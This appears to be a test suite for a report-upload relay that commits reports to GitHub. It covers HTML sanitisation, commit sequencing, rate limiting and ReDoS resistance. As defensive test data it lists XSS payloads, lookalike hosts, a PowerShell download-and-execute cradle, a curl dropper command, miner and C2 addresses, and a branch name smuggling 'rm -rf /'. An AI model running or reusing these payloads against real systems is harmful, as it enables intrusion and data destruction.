  ['javascript: href', (h) => h.replace('href="#top"', 'href="javascript:alert(1)"')],
  ['mixed-case javascript: href', (h) => h.replace('href="#top"', 'href="JaVaScRiPt:alert(1)"')],
  ['entity-obfuscated javascript:', (h) => h.replace('href="#top"', 'href="java&#115;cript:alert(1)"')],
  ['tab-obfuscated javascript:', (h) => h.replace('href="#top"', 'href="java&Tab;script:alert(1)"')],
  ['data: href', (h) => h.replace('href="#top"', 'href="data:text/html;base64,AAAA"')],
  ['protocol-relative href', (h) => h.replace('href="#top"', 'href="//evil.example/x"')],
  ['relative href', (h) => h.replace('href="#top"', 'href="../x"')],
  ['external https href', (h) => h.replace('href="#top"', 'href="https://evil.example/x"')],
  ['external url in a style attribute', (h) => h.replace('<h1>', '<h1 style="background:url(https://evil.example/p.png)">')],
  ['http github (not https)', (h) => h.replace('https://github.com/iiKurro', 'http://github.com/iiKurro')],
  ['lookalike github host', (h) => h.replace('https://github.com/iiKurro', 'https://github.com.evil.example/iiKurro')],
  ['userinfo github trick', (h) => h.replace('https://github.com/iiKurro', 'https://github.com@evil.example/iiKurro')],
  ['virustotal with short hash', (h) => h.replace(VT64, VT64.slice(0, 63))],
  ['virustotal other path', (h) => h.replace('/gui/file/' + VT64, '/gui/url/' + VT64)],
  ['img src external', (h) => h.replace('<main>', '<main><img src="https://evil.example/p.png">')],
  ['srcdoc', (h) => h.replace('<main>', '<main><div srcdoc="x"></div>')],
  ['css @import', (h) => h.replace('body{', '@import "x";body{')],
  ['css url external', (h) => h.replace('body{background:var(--bg)}', 'body{background:url(https://evil.example/p.png)}')],
  ['css url relative', (h) => h.replace('body{background:var(--bg)}', 'body{background:url(x.png)}')],
  ['css expression', (h) => h.replace('body{background:var(--bg)}', 'body{width:expression(alert(1))}')],
  ['css escaped url', (h) => h.replace('body{background:var(--bg)}', 'body{background:\\75rl(x.png)}')],
  ['style attribute url', (h) => h.replace('<h1>', '<h1 style="background:url(x)">')],
  ['unterminated tag', () => '<!doctype html><!-- ram-doctor-report v1 --><html><body><h1 title="x>'],
  ['unterminated tag (no closing >)', () => '<!doctype html><!-- ram-doctor-report v1 --><html><body><h1 class=x'],
  ['too many attributes in one tag', (h) => h.replace('<h1>', '<h1' + ' a=1'.repeat(101) + '>')],
  ['processing instruction', (h) => h.replace('<main>', '<main><?php x ?>')],
  ['math', (h) => h.replace('<main>', '<main><math><mi>x</mi></math>')],
];
for (const [title, mutate] of REPORT_EVIL) {
  test('report.html rejected: ' + title, () => {
    const r = checkReportHtml(mutate(GOOD_REPORT));
    assert.equal(r.ok, false);
    assert.ok(typeof r.reason === 'string' && r.reason.length > 0);
  });
}

test('rejected report.html => 400 "report_rejected", GitHub untouched, reason logged but not returned', async () => {
  const cap = captureConsole();
  let r;
  try {
    r = await post(withFile('report.html', GOOD_REPORT.replace('<h1>', '<h1 onclick="x()">')));
  } finally {
    cap.restore();
  }
  assert.equal(r.res.status, 400);
  assert.deepEqual(r.json, { ok: false, error: 'report_rejected', field: 'report.html' });
  assert.equal(r.gh.calls.length, 0);
  assert.ok(cap.lines.some((l) => l.includes('content_rejected') && l.includes('event_attr')));
});

// ------------------------------------------------------------------------------------------------ commit sequence

test('atomic commit: ref -> commit -> blobs -> tree(base_tree) -> commit -> ref update (not forced)', async () => {
  const { res, json, gh } = await post(payload());
  assert.equal(res.status, 200);
  assert.deepEqual(json, {
    ok: true,
    folder: 'reports/friend-one-0a1b2c3d/' + STAMP,
    url: 'https://github.com/iiKurro/ram-doctor-reports/tree/main/reports/friend-one-0a1b2c3d/' + STAMP,
  });

  const seq = gh.calls.map((c) => c.method + ' ' + c.path.replace(/[0-9a-f]{40}$/, '<sha>'));
  assert.deepEqual(seq, [
    'GET /git/ref/heads/main',
    'GET /git/commits/<sha>',
    'POST /git/blobs', 'POST /git/blobs', 'POST /git/blobs', 'POST /git/blobs',
    'POST /git/trees',
    'POST /git/commits',
    'PATCH /git/refs/heads/main',
  ]);

  for (const c of gh.calls) {
    assert.equal(c.host, 'api.github.com');
    assert.equal(c.headers.get('authorization'), 'Bearer ' + TOKEN);
    assert.equal(c.headers.get('accept'), 'application/vnd.github+json');
    assert.equal(c.headers.get('x-github-api-version'), '2022-11-28');
    assert.equal(c.headers.get('user-agent'), 'ram-doctor-relay');
  }

  const blobs = gh.calls.filter((c) => c.path === '/git/blobs').map((c) => c.body);
  assert.deepEqual(blobs.map((b) => b.encoding), ['utf-8', 'utf-8', 'utf-8', 'utf-8']);
  assert.equal(blobs[0].content, '# Summary\nمرحبا UNIQUE_CONTENT_MARKER');
  assert.equal(blobs[1].content, GOOD_REPORT);
  assert.equal(blobs[2].content, GOOD_PLAN);
  const meta = JSON.parse(blobs[3].content);
  assert.equal(meta.displayName, 'Friend One');
  assert.equal(meta.userId, '0a1b2c3d');
  assert.equal(meta.host, '<PC>');
  assert.equal(meta.inviteLabel, 'friend-label');
  assert.equal(meta.clientCreatedAt, '2020-01-01T00:00:00Z');
  assert.equal(meta.receivedAt, '2026-10-24T10:15:00.000Z'); // server clock, not the client's 2020 value
  assert.deepEqual(meta.files, ['summary.md', 'report.html', 'plan.json']);
  assert.ok(!JSON.stringify(meta).includes(CODE), 'the invite code must never be stored');

  const tree = gh.calls.find((c) => c.path === '/git/trees').body;
  assert.equal(tree.base_tree, sha('e', 1));
  const prefix = 'reports/friend-one-0a1b2c3d/' + STAMP + '/';
  assert.deepEqual(tree.tree.map((t) => t.path), ['summary.md', 'report.html', 'plan.json', 'meta.json'].map((n) => prefix + n));
  assert.deepEqual(tree.tree.map((t) => t.sha), [sha('b', 1), sha('b', 2), sha('b', 3), sha('b', 4)]);
  for (const t of tree.tree) {
    assert.equal(t.mode, '100644');
    assert.equal(t.type, 'blob');
  }

  const commit = gh.calls.find((c) => c.path === '/git/commits').body;
  assert.equal(commit.message, 'report: Friend One 0a1b2c3d ' + STAMP);
  assert.equal(commit.tree, sha('c', 1));
  assert.deepEqual(commit.parents, [sha('a', 1)]);
  assert.equal(commit.author.name, 'ram-doctor-relay[bot]');
  assert.match(commit.author.email, /@users\.noreply\.github\.com$/);
  assert.deepEqual(commit.author, commit.committer);

  assert.deepEqual(gh.calls.find((c) => c.method === 'PATCH').body, { sha: sha('d', 1), force: false });
});

test('ref race: 422 on the update => retries ONCE on the new head, blobs are reused', async () => {
  const gh = mockGithub({ heads: [sha('a', 1), sha('a', 2)], patch: [422, 200] });
  const { res } = await post(payload(), ENV, gh);
  assert.equal(res.status, 200);
  assert.equal(gh.calls.filter((c) => c.path === '/git/blobs').length, 4, 'blobs are created once');
  assert.equal(gh.calls.filter((c) => c.method === 'PATCH').length, 2);
  assert.equal(gh.calls.filter((c) => c.path.startsWith('/git/ref/')).length, 2);
  const commits = gh.calls.filter((c) => c.path === '/git/commits').map((c) => c.body);
  assert.deepEqual(commits[0].parents, [sha('a', 1)]);
  assert.deepEqual(commits[1].parents, [sha('a', 2)]);
});

test('ref race: 409 also retries; a second failure => 502 (no endless loop)', async () => {
  const ok = mockGithub({ heads: [sha('a', 1), sha('a', 2)], patch: [409, 200] });
  assert.equal((await post(payload(), ENV, ok)).res.status, 200);
  const dead = mockGithub({ heads: [sha('a', 1), sha('a', 2), sha('a', 3)], patch: [422, 422, 422] });
  const r = await post(payload(), ENV, dead);
  assert.equal(r.res.status, 502);
  assert.deepEqual(r.json, { ok: false, error: 'upstream_error' });
  assert.equal(dead.calls.filter((c) => c.method === 'PATCH').length, 2);
});

test('non-race update failures are not retried', async () => {
  const gh = mockGithub({ patch: [403] });
  const r = await post(payload(), ENV, gh);
  assert.equal(r.res.status, 502);
  assert.equal(gh.calls.filter((c) => c.method === 'PATCH').length, 1);
});

test('custom branch is URL-encoded per segment and used in the response URL', async () => {
  const gh = mockGithub();
  const r = await post(payload(), Object.assign({}, ENV, { GITHUB_BRANCH: 'data/main' }), gh);
  assert.equal(r.res.status, 200);
  assert.equal(gh.calls[0].path, '/git/ref/heads/data/main');
  assert.ok(r.json.url.includes('/tree/data/main/reports/'));
  assert.equal(gh.calls.at(-1).path, '/git/refs/heads/data/main');
});

// ------------------------------------------------------------------------------------------------ error mapping / secrets

test('GitHub failures map to a generic 502 and never leak secrets', async () => {
  const cases = [
    ['ref 404', (c) => (c.method === 'GET' && c.path.startsWith('/git/ref/') ? new Response('{"message":"Not Found"}', { status: 404 }) : null)],
    ['bad token 401', () => new Response('{"message":"Bad credentials"}', { status: 401 })],
    ['blob 500', (c) => (c.path === '/git/blobs' ? new Response('boom', { status: 500 }) : null)],
    ['network error', () => { throw new TypeError('fetch failed'); }],
    ['tree 422', (c) => (c.path === '/git/trees' ? new Response('{"message":"Invalid"}', { status: 422 }) : null)],
  ];
  for (const [title, override] of cases) {
    const { res, json } = await post(payload(), ENV, mockGithub({ override }));
    assert.equal(res.status, 502, title);
    assert.deepEqual(json, { ok: false, error: 'upstream_error' }, title);
    const text = JSON.stringify(json);
    assert.ok(!text.includes(TOKEN) && !text.includes(CODE), title);
  }
});

test('missing/invalid configuration => generic 500 and no GitHub calls', async () => {
  const bad = [
    { GITHUB_TOKEN: undefined }, { GITHUB_TOKEN: '' }, { GITHUB_OWNER: undefined }, { GITHUB_REPO: 'a/b' },
    { GITHUB_BRANCH: 'main;rm -rf /' },
  ];
  for (const o of bad) {
    const { res, json, gh } = await post(payload(), Object.assign({}, ENV, o));
    assert.equal(res.status, 500, JSON.stringify(o));
    assert.deepEqual(json, { ok: false, error: 'server_error' });
    assert.equal(gh.calls.length, 0);
  }
});

test('logs and responses never contain the token, invite code or report contents', async () => {
  const cap = captureConsole();
  const bodies = [];
  try {
    bodies.push((await post(payload())).json);
    bodies.push((await post(payload({ code: 'RD-WRONG-CODE-9999' }))).json);
    bodies.push((await post(payload({ userId: 'nope' }))).json);
    bodies.push((await post(payload(), ENV, mockGithub({ override: () => new Response('x', { status: 500 }) }))).json);
    bodies.push((await post(payload(), Object.assign({}, ENV, { GITHUB_TOKEN: '' }))).json);
    bodies.push((await post(payload(), ENV, mockGithub({ heads: [sha('a', 1), sha('a', 2)], patch: [422, 200] }))).json);
    bodies.push((await post(withFile('report.html', GOOD_REPORT.replace('<h1>', '<h1 onclick="x()">')))).json);
    bodies.push((await post(payload(), Object.assign({}, ENV, { DISABLED: '1' }))).json);
  } finally {
    cap.restore();
  }
  const all = cap.lines.join('\n') + '\n' + JSON.stringify(bodies);
  for (const secret of [TOKEN, CODE, 'UNIQUE_CONTENT_MARKER', 'UNIQUE_REPORT_MARKER', 'مرحبا', 'svch0st', 'RD-WRONG-CODE-9999']) {
    assert.ok(!all.includes(secret), 'leaked: ' + secret);
  }
  assert.ok(cap.lines.length > 0, 'metadata logging is expected');
});

// ------------------------------------------------------------------------------------------------ rate limiting

test('per-IP limit: 6 per hour, then 429 + Retry-After (to the next hour); other IPs unaffected', async () => {
  const kv = makeKv();
  const env = openEnv(kv);
  const headers = { 'CF-Connecting-IP': '198.51.100.7' };
  for (let i = 0; i < LIMITS.perIpPerHour; i++) {
    const r = await post(payload({ userId: ('0000000' + i).slice(-8) }), env, mockGithub(), { headers });
    assert.equal(r.res.status, 200, 'upload ' + (i + 1));
  }
  const gh = mockGithub();
  const over = await post(payload({ userId: 'abcdef01' }), env, gh, { headers });
  assert.equal(over.res.status, 429);
  assert.deepEqual(over.json, { ok: false, error: 'rate_limited' });
  assert.equal(over.res.headers.get('retry-after'), '2700'); // 10:15:00 -> 11:00:00
  assert.equal(gh.calls.length, 0);
  const other = await post(payload(), env, mockGithub(), { headers: { 'CF-Connecting-IP': '198.51.100.8' } });
  assert.equal(other.res.status, 200);
  // next hour the counter has rolled over
  const later = await post(payload({ userId: 'abcdef02' }), env, mockGithub(), { headers }, NOW + HOUR);
  assert.equal(later.res.status, 200);
});

const HOUR = 3600 * 1000;

test('per-IP daily limit: 20 per UTC day (even when hourly windows roll), Retry-After to the next day', async () => {
  const env = openEnv();
  const headers = { 'CF-Connecting-IP': '198.51.100.9' };
  let n = 0;
  for (let h = 0; h < 4 && n < LIMITS.perIpPerDay; h++) {
    for (let i = 0; i < LIMITS.perIpPerHour && n < LIMITS.perIpPerDay; i++, n++) {
      const r = await post(payload({ userId: n.toString(16).padStart(8, '0') }), env, mockGithub(), { headers }, NOW + h * HOUR);
      assert.equal(r.res.status, 200, 'upload ' + (n + 1));
    }
  }
  assert.equal(n, LIMITS.perIpPerDay);
  const over = await post(payload({ userId: 'ffffff00' }), env, mockGithub(), { headers }, NOW + 3 * HOUR);
  assert.equal(over.res.status, 429);
  assert.equal(over.res.headers.get('retry-after'), String((24 * 3600) - (10 * 3600 + 15 * 60) - 3 * 3600)); // to 00:00 UTC
  // next UTC day is fine again
  const next = await post(payload({ userId: 'ffffff01' }), env, mockGithub(), { headers }, NOW + 14 * HOUR);
  assert.equal(next.res.status, 200);
});

test('per-user limits: 10 folders/hour and 20/day per userId (different IPs)', async () => {
  const env = openEnv();
  let ip = 0;
  for (let i = 0; i < LIMITS.perUserPerHour; i++) {
    assert.equal((await post(payload(), env, mockGithub(), { headers: ipHdr(ip++) })).res.status, 200, 'hour upload ' + (i + 1));
  }
  const over = await post(payload(), env, mockGithub(), { headers: ipHdr(ip++) });
  assert.equal(over.res.status, 429);
  assert.equal(over.res.headers.get('retry-after'), '2700');
  // another user is unaffected
  assert.equal((await post(payload({ userId: 'ffffffff' }), env, mockGithub(), { headers: ipHdr(ip++) })).res.status, 200);
  // second hour: 10 more reach the daily cap of 20
  for (let i = 0; i < LIMITS.perUserPerHour; i++) {
    assert.equal((await post(payload(), env, mockGithub(), { headers: ipHdr(ip++) }, NOW + HOUR)).res.status, 200, 'second hour upload ' + (i + 1));
  }
  const dayOver = await post(payload(), env, mockGithub(), { headers: ipHdr(ip++) }, NOW + 2 * HOUR);
  assert.equal(dayOver.res.status, 429);
  assert.equal(dayOver.res.headers.get('retry-after'), String(24 * 3600 - (12 * 3600 + 15 * 60)));
});

test('failed/invalid attempts count against the IP but cannot burn a userId quota', async () => {
  const kv = makeKv();
  const env = Object.assign({}, openEnv(kv));
  const headers = { 'CF-Connecting-IP': '198.51.100.20' };
  for (let i = 0; i < LIMITS.perIpPerHour; i++) {
    const r = await post(payload({ userId: 'zzzzzzzz' }), env, mockGithub(), { headers }); // invalid userId
    assert.equal(r.res.status, 400);
  }
  assert.equal((await post(payload(), env, mockGithub(), { headers })).res.status, 429);
  assert.ok(![...kv.store.keys()].some((k) => k.startsWith('u:')), 'no per-user counter before the payload is valid');
  assert.ok([...kv.store.keys()].some((k) => k.startsWith('ip:')));
});

test('code mode: wrong codes also count against the IP (brute-force brake); per-user counter needs a valid code', async () => {
  const kv = makeKv();
  const env = Object.assign({}, ENV, { RATE: kv });
  const headers = { 'CF-Connecting-IP': '198.51.100.30' };
  for (let i = 0; i < LIMITS.perIpPerHour; i++) {
    assert.equal((await post(payload({ code: 'RD-WRONG-CODE-' + i }), env, mockGithub(), { headers })).res.status, 401);
  }
  assert.equal((await post(payload({ code: 'RD-WRONG-CODE-X' }), env, mockGithub(), { headers })).res.status, 429);
  assert.ok(![...kv.store.keys()].some((k) => k.startsWith('u:')));
});

test('code mode fails OPEN when KV is unbound or erroring (the invite code is the gate)', async () => {
  for (let i = 0; i < 15; i++) assert.equal((await post(payload())).res.status, 200); // no RATE binding
  assert.equal((await post(payload(), Object.assign({}, ENV, { RATE: makeKv(true) }))).res.status, 200);
});

test('one KV key per subject holds both windows; corrupted values are tolerated', async () => {
  const kv = makeKv();
  await rateHit(kv, 'ip:x', { hour: 2, day: 5 }, NOW);
  assert.equal(kv.store.size, 1);
  const v = JSON.parse(kv.store.get('ip:x'));
  assert.deepEqual(v, { h: [Math.floor(NOW / HOUR), 1], d: [Math.floor(NOW / (24 * HOUR)), 1] });
  kv.store.set('ip:y', 'not json{');
  assert.equal((await rateHit(kv, 'ip:y', { hour: 2, day: 5 }, NOW)).ok, true);
});

test('rateHit unit: counts, blocks at the limit, rolls over each hour and day', async () => {
  const kv = makeKv();
  const lim = { hour: 2, day: 3 };
  assert.equal((await rateHit(kv, 'k', lim, NOW)).ok, true);
  assert.equal((await rateHit(kv, 'k', lim, NOW)).ok, true);
  const third = await rateHit(kv, 'k', lim, NOW);
  assert.equal(third.ok, false);
  assert.equal(third.retryAfter, 2700);
  assert.equal((await rateHit(kv, 'k', lim, NOW + HOUR)).ok, true); // new hour, 3rd of the day
  const dayFull = await rateHit(kv, 'k', lim, NOW + 2 * HOUR);
  assert.equal(dayFull.ok, false);
  assert.equal(dayFull.retryAfter, 24 * 3600 - (12 * 3600 + 15 * 60));
  assert.equal((await rateHit(kv, 'k', lim, NOW + 14 * HOUR)).ok, true); // next UTC day
  assert.deepEqual(await rateHit(undefined, 'k', lim, NOW), { ok: true, unbound: true });
  assert.deepEqual(await rateHit(makeKv(true), 'k', lim, NOW), { ok: true, error: true });
});

// ------------------------------------------------------------------------------------------------ follow-up: text vs active contexts, marker, CPU budget

const CMD_LINES = [
  'stratum+tcp://pool.example:3333',
  'https://evil.example/x.ps1',
  'powershell -nop -c &quot;iwr https://evil.example/a.ps1 | iex&quot;',
  'ftp://203.0.113.9/payload.exe  wss://c2.example/ws  file:///C:/Users/Friend/x.exe',
  'curl -o x.exe http://malware.example/dropper.exe',
  'javascript:alert(1) data:text/html;base64,AAAA (shown as plain text)',
];

test('URLs shown as plain TEXT (command lines, download cradles, pool addresses) are accepted', () => {
  for (const line of CMD_LINES) {
    const inP = GOOD_REPORT.replace('UNIQUE_REPORT_MARKER', line);
    assert.equal(checkReportHtml(inP).ok, true, 'text node: ' + line);
    const inCode = GOOD_REPORT.replace('<main>', '<main><pre class="mono"><code>' + line + '</code></pre>');
    assert.equal(checkReportHtml(inCode).ok, true, 'pre/code: ' + line);
    const inTitle = GOOD_REPORT.replace('<h1>', '<h1 title="' + line.replace(/"/g, '&quot;') + '">');
    assert.equal(checkReportHtml(inTitle).ok, true, 'title attribute: ' + line); // title is not a URL-bearing attribute
  }
  const inComment = GOOD_REPORT.replace('<main>', '<main><!-- https://evil.example/x -->');
  assert.equal(checkReportHtml(inComment).ok, true, 'html comment');
  // end to end: such a report is committed untouched
  return post(withFile('report.html', GOOD_REPORT.replace('UNIQUE_REPORT_MARKER', CMD_LINES[0] + ' ' + CMD_LINES[1]))).then((r) => {
    assert.equal(r.res.status, 200);
    assert.ok(r.gh.calls.filter((c) => c.path === '/git/blobs')[1].body.content.includes('stratum+tcp://pool.example:3333'));
  });
});

test('the same URLs in ACTIVE contexts are rejected', () => {
  const urls = ['https://evil.example/x.ps1', 'stratum+tcp://pool.example:3333', 'http://malware.example/a', '//evil.example/a', 'ftp://203.0.113.9/p'];
  const contexts = [
    ['href', (u) => (h) => h.replace('href="#top"', 'href="' + u + '"')],
    ['src', (u) => (h) => h.replace('<main>', '<main><img src="' + u + '">')],
    ['srcset', (u) => (h) => h.replace('<main>', '<main><img srcset="' + u + ' 1x">')],
    ['action', (u) => (h) => h.replace('<main>', '<main><div action="' + u + '"></div>')],
    ['poster', (u) => (h) => h.replace('<main>', '<main><div poster="' + u + '"></div>')],
    ['xlink:href', (u) => (h) => h.replace('<path', '<use xlink:href="' + u + '"/><path')],
    ['unquoted href', (u) => (h) => h.replace('href="#top"', 'href=' + u)],
    ['css url() in <style>', (u) => (h) => h.replace('body{background:var(--bg)}', 'body{background:url(' + u + ')}')],
    ['css url() quoted', (u) => (h) => h.replace('body{background:var(--bg)}', 'body{background:url("' + u + '")}')],
    ['css @import', (u) => (h) => h.replace('body{', '@import url(' + u + ');body{')],
    ['css url() in style attribute', (u) => (h) => h.replace('<h1>', '<h1 style="background:url(' + u + ')">')],
  ];
  for (const [cname, make] of contexts) {
    for (const u of urls) {
      const r = checkReportHtml(make(u)(GOOD_REPORT));
      assert.equal(r.ok, false, cname + ' <- ' + u);
    }
  }
  assert.equal(checkReportHtml(GOOD_REPORT.replace('<head>', '<head><meta http-equiv="refresh" content="0;url=https://evil.example/">')).ok, false);
});

test('allowed active URLs: VirusTotal file page (64 hex), github.com, #fragments, svg namespace', () => {
  assert.equal(checkReportHtml(GOOD_REPORT).ok, true); // contains all of them
  assert.equal(checkReportHtml(GOOD_REPORT.replace('<main>', '<main><a href="https://github.com/iiKurro/ram-doctor-reports">x</a><a href="#sec-2">y</a>')).ok, true);
  assert.equal(checkReportHtml(GOOD_REPORT.replace('<main>', '<main><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="#a"/></svg>')).ok, true);
});

test('marker: right after the doctype, optional version v1 / v1.0 / v1.0.0, flexible whitespace and case', () => {
  const body = GOOD_REPORT.replace('<!-- ram-doctor-report v1.0.0 -->', '@@');
  for (const m of ['<!-- ram-doctor-report -->', '<!-- ram-doctor-report v1 -->', '<!-- ram-doctor-report v1.0 -->', '<!-- ram-doctor-report v1.0.0 -->', '<!-- ram-doctor-report v12.34.56 -->']) {
    assert.equal(checkReportHtml(body.replace('@@', m)).ok, true, m);
    assert.equal(checkReportHtml(body.replace('<!doctype html>@@', '<!DOCTYPE html>\r\n' + m + '\n')).ok, true, 'newlines/case: ' + m);
  }
  assert.equal(checkReportHtml('\uFEFF' + body.replace('@@', '<!-- ram-doctor-report v1.0.0 -->')).ok, true, 'leading BOM');
  for (const m of ['<!-- ram-doctor-report v1.0.0.0 -->', '<!-- ram-doctor-report v -->', '<!-- ram-doctor-reports v1 -->', '<!--ram-doctor-report v1-->', '<!-- RAM-DOCTOR-REPORT v1 -->x']) {
    if (m === '<!-- RAM-DOCTOR-REPORT v1 -->x') continue; // case-insensitive marker is accepted; trailing text after --> is irrelevant
    assert.equal(checkReportHtml(body.replace('@@', m)).ok, false, m);
  }
});

test('exact per-file caps in force (bytes): summary 131072, report 524288, plan 524288, any file 1572864, body 2097152', () => {
  assert.deepEqual({ ...FILE_CAPS }, { 'summary.md': 131072, 'report.html': 524288, 'plan.json': 524288 });
  assert.equal(MAX_FILE_BYTES, 1572864);
  assert.equal(MAX_BODY_BYTES, 2097152);
  assert.equal(MAX_SCRIPT_BYTES, 3072);
});

// -- CPU / ReDoS: every validator must stay linear on hostile 512 KB inputs (a free Worker has ~10 ms of CPU)

const HALF_MB = 512 * 1024;
const HEAD = '<!doctype html><!-- ram-doctor-report v1 --><html><body>';
const BUDGET_MS = 400; // generous for CI noise; a quadratic algorithm on 512 KB needs seconds to minutes
function timed(label, fn) {
  const t0 = performance.now();
  const out = fn();
  const ms = performance.now() - t0;
  assert.ok(ms < BUDGET_MS, label + ' took ' + ms.toFixed(0) + ' ms (budget ' + BUDGET_MS + ')');
  return out;
}
const rep = (s, bytes) => s.repeat(Math.ceil(bytes / s.length)).slice(0, bytes);

test('report.html checker is linear on pathological 512 KB inputs', () => {
  const inputs = {
    'repeated <style without >': HEAD + rep('<style', HALF_MB),
    'repeated <style> never closed': HEAD + rep('<style>', HALF_MB),
    'repeated <script': HEAD + rep('<script', HALF_MB),
    'repeated </': HEAD + rep('</', HALF_MB),
    'repeated <': HEAD + rep('<', HALF_MB),
    'repeated <a href=" (unclosed quote)': HEAD + rep('<a href="', HALF_MB),
    'nested quotes': HEAD + rep('<a title=\'"\' x="\'" y=\'"\'', HALF_MB),
    'repeated <div  (no end)': HEAD + rep('<div ', HALF_MB),
    'many tiny attributes': HEAD + '<div ' + rep('a ', HALF_MB) + '>',
    'repeated comment openers': HEAD + rep('<!--', HALF_MB),
    'many closed comments': HEAD + rep('<!-- x -->', HALF_MB),
    'many comments closed by --!>': HEAD + rep('<!-- x --!>', HALF_MB),
    'many <! bogus comments': HEAD + rep('<![CDATA[ x >', HALF_MB),
    'huge whitespace run in a tag': HEAD + '<a' + ' '.repeat(HALF_MB) + 'href=x>',
    'huge unquoted value': HEAD + '<a href=' + 'a'.repeat(HALF_MB) + '>',
    'huge quoted href of entities': HEAD + '<a href="' + rep('&#x', HALF_MB) + '">',
    'huge href of spaces': HEAD + '<a href="' + ' '.repeat(HALF_MB) + '">',
    'css: unterminated comments': HEAD + '<style>' + rep('/*', HALF_MB) + '</style>',
    'css: url( spam': HEAD + '<style>' + rep('url(', HALF_MB) + '</style>',
    'css: expression spam': HEAD + '<style>' + rep('expression', HALF_MB) + '</style>',
    'css: backslash spam': HEAD + '<style>' + rep('\\', HALF_MB) + '</style>',
    'css: whitespace after url': HEAD + '<style>a{b:url' + ' '.repeat(HALF_MB) + '(x)}</style>',
    'style attribute css spam': HEAD + '<div style="' + rep('/*', HALF_MB) + '">',
    'many </script lookalikes inside a script': HEAD + '<script>' + rep('</scrip', HALF_MB) + '</script>',
    'many </style lookalikes': HEAD + '<style>' + rep('</styl', HALF_MB),
    'script with forbidden-token whitespace spam': HEAD + '<script>document' + ' '.repeat(HALF_MB) + '.write</script>',
  };
  for (const [label, html] of Object.entries(inputs)) {
    const r = timed(label, () => checkReportHtml(html));
    assert.equal(typeof r.ok, 'boolean', label);
  }
});

test('summary sanitiser, plan checker and schema validator are linear on hostile input', () => {
  const sanitizers = {
    '](+spaces': '](' + ' '.repeat(HALF_MB),
    'repeated ](': rep('](', HALF_MB),
    'repeated ](javascript': rep('](javascript', HALF_MB),
    'repeated ]:   ': rep(']:   ', HALF_MB),
    'repeated <': '<'.repeat(HALF_MB),
    'repeated <br': rep('<br', HALF_MB),
    'repeated ![': rep('![', HALF_MB),
    'private-use spam': String.fromCharCode(0xe000).repeat(HALF_MB),
  };
  for (const [label, s] of Object.entries(sanitizers)) timed('sanitize ' + label, () => sanitizeSummary(s));

  const plans = {
    'deep arrays': '['.repeat(500000),
    'deep objects': rep('{"a":', HALF_MB),
    'wide array': '[' + rep('1,', HALF_MB) + '1]',
    'long string': '{"tool":"RAM-Doctor","a":"' + 'x'.repeat(HALF_MB) + '"}',
    'not json': 'x'.repeat(HALF_MB),
  };
  for (const [label, s] of Object.entries(plans)) {
    const r = timed('plan ' + label, () => checkPlanJson(s));
    assert.equal(r.ok, false, label);
  }

  timed('schema: huge displayName', () => validatePayload(payload({ displayName: 'x'.repeat(1000000) })));
  timed('schema: huge host', () => validatePayload(payload({ host: 'x'.repeat(1000000) })));
  timed('schema: huge code', () => validatePayload(payload({ code: 'x'.repeat(1000000) })));
  timed('schema: huge version', () => validatePayload(payload({ tool: { name: 'RAM-Doctor', version: '1.'.repeat(500000) } })));
  const big = validatePayload(withFile('report.html', 'a'.repeat(FILE_CAPS['report.html'] + 1)));
  assert.equal(big.status, 413);
  timed('schema: oversize file rejected without scanning', () => validatePayload(withFile('summary.md', 'a'.repeat(1000000))));
});

test('end to end: a hostile 500 KB report.html is rejected quickly with 400 report_rejected', async () => {
  const hostile = HEAD + rep('<a href="', 500 * 1024);
  const t0 = performance.now();
  const r = await post(withFile('report.html', hostile));
  assert.ok(performance.now() - t0 < 1000, 'request took too long');
  assert.equal(r.res.status, 400);
  assert.deepEqual(r.json, { ok: false, error: 'report_rejected', field: 'report.html' });
  assert.equal(r.gh.calls.length, 0);
});